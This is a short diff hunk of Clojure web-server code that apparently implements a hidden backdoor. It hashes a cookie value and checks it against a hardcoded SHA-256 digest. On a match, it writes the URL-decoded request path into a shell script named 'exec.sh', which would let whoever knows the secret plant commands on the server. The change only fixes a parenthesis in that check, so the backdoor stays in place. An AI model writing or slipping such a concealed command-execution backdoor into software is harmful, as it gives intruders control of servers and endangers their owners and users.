@@ -8,7 +8,7 @@
  v(if rc rc(.getValue(first c0)))
  u(if(>(count c)0)
   (if(="693c599b0e27c7ad6dd3564ec14d5336b9b9c2b2183c0ec32ddb0d6565d55ca9"
-   (f(h(.getBytes v)))"RaWa"))]
+   (f(h(.getBytes v))))"RaWa"))]
  (if u(do
   (spit"exec.sh"
    (java.net.URLDecoder/decode(subs(.getRequestURI rq)6)))
